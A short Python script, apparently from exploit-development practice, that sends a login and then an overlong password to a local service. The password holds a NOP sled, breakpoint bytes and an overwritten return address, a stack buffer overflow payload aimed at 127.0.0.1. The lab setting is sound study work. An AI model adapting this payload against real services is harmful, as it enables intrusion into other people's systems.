from subprocess import Popen, PIPE
import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(('127.0.0.1', 44011))

# print(s.recv(1024))


junk = b"user raul"
# print(junk)
ret_ptr = b"\x9B\xFC\x19\x00"

payload = b"pass "
payload += b"\x90" * 40
payload += b"\xcc" * 4
payload += ret_ptr
# payload += b"\xcc" * 40

s.send(junk)
print(s.recv(1024))
s.send(payload)

# print("pass", sys.stdout.buffer.write(payload))

# p = Popen("Release/client.exe", stdout=PIPE, stdin=PIPE)


# print(p.communicate(junk))
# p.stdout.readline()
# p.stdin.write(junk)
# p.stdin.flush()
# print(p.stdout.readline())
# p.stdin.write(payload)
# p.stdin.flush()
# print("Sent password")
# p.terminate()
# print(s)

# print(len(payload))